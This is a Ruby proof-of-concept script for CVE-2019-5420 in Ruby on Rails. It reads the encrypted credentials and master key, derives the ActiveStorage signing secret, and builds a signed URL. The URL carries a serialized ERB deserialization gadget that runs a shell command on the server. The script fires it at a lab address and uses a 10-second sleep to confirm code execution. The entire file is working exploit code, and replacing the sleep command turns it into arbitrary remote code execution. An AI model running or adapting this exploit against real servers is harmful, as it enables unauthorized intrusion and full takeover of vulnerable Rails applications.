require 'net/http'
require 'base64'
require 'rails'
require 'erb'


$remote = "http://172.18.0.2:3000"
$ressource = "/demo"

creds_path = "/root/credentials.yml.enc"
key_path =  "/root/master.key"


creds_path_sanitized = File.read(creds_path).chomp
File.open(creds_path, 'w') { |file| file.write(creds_path_sanitized) }

key_path_sanitized = File.read(key_path).chomp
File.open(key_path, 'w') { |file| file.write(key_path_sanitized) }

ENV['RAILS_MASTER_KEY'] = File.read('/root/master.key')

puts "Config: #{File.read(creds_path)}"
puts "Key : #{File.read(key_path)}"
puts "Config File Exists: #{File.exist?(creds_path)}"
puts "Key File Exists: #{File.exist?(key_path)}"
puts "RAILS_MASTER_KEY=#{ENV['RAILS_MASTER_KEY']}"
puts ""
print "[+] Decrypt secret_key_base => "

credentials = ActiveSupport::EncryptedConfiguration.new(
    config_path: creds_path,
    key_path: key_path,
    env_key: 'RAILS_MASTER_KEY',
    raise_if_missing_key: true
)

if credentials.secret_key_base != nil
    puts ""
    puts "\033[92mSecret Key Base: #{credentials.secret_key_base}\033[0m"
    puts ""
end

print "[+] Exploiting CVE-2019-5420 => "
command = "system('bash','-c','sleep 10')"  
command_b64 = Base64.encode64(command)
puts "command : #{command}"
secret_key_base = credentials.secret_key_base
key_generator = ActiveSupport::CachingKeyGenerator.new(ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000))
secret = key_generator.generate_key("ActiveStorage")
verifier = ActiveSupport::MessageVerifier.new(secret)
erb = ERB.allocate
erb.instance_variable_set :@src, command
erb.instance_variable_set :@filename, "1"
erb.instance_variable_set :@lineno, 1
dump_target  = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result
puts ""
url = $remote + "/rails/active_storage/disk/" + verifier.generate(dump_target, purpose: :blob_key) + "/test"
puts "\033[92mURL Generated : #{url}\033[0m"
puts ""

print "[+] Triggering the exploit => "
uri = URI(url)
http = Net::HTTP.new(uri.hostname, uri.port)
http.read_timeout = 10
req = Net::HTTP::Get.new(uri)
begin
    res = http.request(req)
rescue Net::ReadTimeout
    puts "\033[92m[WIN] The server slept : 10sec\033[0m"
else
    puts "Not working - #{res.code}"
    abort
end